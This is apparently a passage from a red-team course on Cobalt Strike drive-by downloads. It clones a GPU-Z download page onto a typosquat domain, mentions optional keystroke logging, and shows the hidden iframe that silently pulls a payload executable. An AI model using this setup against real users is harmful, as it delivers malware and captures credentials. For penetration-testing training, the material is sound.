The techniques described above typically require the red team to build a legitimate looking website on a standalone web server (e.g. running Apache or Nginx) and manually backdoor one or more pages with the smuggling code.  Cobalt Strike has it's own drive-by capabilities, although it doesn't use smuggling.  It can clone a legitimate website and then embed a URL that the target's browser will automatically download without needing a user to click anything on the page.

In this example, I'm going to clone [https://www.bleepingcomputer.com/download/gpu-z/](https://www.bleepingcomputer.com/download/gpu-z/) which looks something like this:

![[Pasted image 20250702203737.png]]

We want a user to visit a page that looks like this, but also have it automatically download our initial access package to their computer.

### Host File

The first thing to do is host the file to download on Cobalt Strike's internal web server, via **Site Management > Host File**.

![[Pasted image 20250702203809.png]]

Where:

- **File** is the original file to upload.  This is your initial access package (although I'm just using a raw executable payload in this example).
    
- **Local URI** is the URI that Cobalt Strike's web server will make this file available on.  I'm using `/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe`.
    
- **Local Host** sets the URL for the hosted file.  It default's to the team server's public IP address but we're using a lookalike domain instead.  This domain obviously needs to point to the public IP of the team server (or a redirector that can redirect the HTTP request to the team server).
    
- **Local Port** defines the port that the file will be hosted on.
    
- **Mime Type** sets the _Content-Type_ that Cobalt Strike's built-in web server will serve the file as.  Leaving it set to automatic will let it decide the best type to use based on the file extension.

Once hosted, it will appear in the Sites manager (**Site Management > Manage**).

![[Pasted image 20250702203947.png]]

Highlighting the row and clicking the **Copy URL** button will place a URL in your clipboard.  In this example it will be _http://www.bleepincomputer.com:80/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe_.

### Clone Site

The next step is to create the site clone and embed the above file into it (**Management > Clone Site**).

![[Pasted image 20250702204021.png]]

Where:

- **Clone URL** is the exact page that we want to clone.  The page we're cloning is _https://www.bleepingcomputer.com/download/gpu-z/_.
    
- **Local URI** is the URI that the team server will host this cloned page on.  We generally want to match this with the URI of the page we're cloning.
    
- **Local Host** and **Port** is as above. 
    
- **Attack** is the resource you want to embed in the cloned page.  Use the **...** button to select any resource that is hosted on Cobalt Strike's team server.
    
- **Log keystrokes** will send any key presses on the cloned site to Cobalt Strike's web log.  This is useful if the cloned page has a login form for instance.

Once cloned, you will get another URL back, which is a concatination of the local host, local port, and local uri:  _http://www.bleepincomputer.com:80/download/gpu-z/_.

This is the URL to send to a user.  When visited, they will see the cloned GPU-Z page and the browser will automatically download our payload as _GPU-Z-2.22.0.exe_.

![[Pasted image 20250702204208.png]]

This works by embedding a hidden iframe into the cloned page where the source is the URL of the hosted file:

```html
<IFRAME SRC="http://www.bleepincomputer.com:80/dl/windows/utilities/system-information/g/gpu-z/GPU-Z.2.22.0.exe?id=null" WIDTH="0" HEIGHT="0"></IFRAME>
```